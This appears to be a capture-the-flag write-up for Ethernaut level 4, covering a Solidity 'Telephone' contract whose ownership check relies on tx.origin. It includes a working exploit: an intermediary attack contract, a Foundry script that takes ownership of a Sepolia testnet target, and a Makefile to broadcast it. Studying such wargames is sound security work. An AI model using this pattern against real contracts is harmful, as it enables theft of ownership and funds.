# Ethernaut Level 4

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

In the target contract, we can see that in the method `changeOwner`, if `tx.origin` is not the `msg.sender`, we can then alter the ownership and exploit the contract. Since `tx.origin` points to the origin of the transaction chain, while `msg.sender` refers to the adjacent caller of the function, they have fundemental differences. We can add a middle layer contract X to call the `changeOwner`, and then use our EOA to call the middle layer's correspondent function, so that we can meet the condition and solve the game.

`TelephoneAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract MiddleLayer {
    ITelephone target;

    constructor(address _targetAddress) {
        target = ITelephone(_targetAddress);
    }

    function attack() public {
        target.changeOwner(msg.sender);
    }
}
```

`Telephone.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";
import {MiddleLayer, ITelephone} from "../src/TelephoneAttack.sol";

contract TelephoneScript is Script {
    address constant TARGET_ADDRESS = 0x2b493EFb3cfC84c1dF1f1711491E6bE53DE44789;
    Telephone telephone = Telephone(TARGET_ADDRESS);

    function run() public {
        vm.startBroadcast();
        console.log("Current owner:", telephone.owner());
        MiddleLayer middleLayer = new MiddleLayer(TARGET_ADDRESS);
        middleLayer.attack();
        vm.stopBroadcast();
        console.log("New owner:", telephone.owner());
    }
}
```

`Makefile`:

```makefile
include .env

SCRIPT := script/Telephone.s.sol:TelephoneScript
RPC_URL ?= $(SEPOLIA_RPC_URL)
ACCOUNT ?= default

deploy:
	forge script $(SCRIPT) --rpc-url $(RPC_URL) --account $(ACCOUNT) --broadcast -vvvv
```

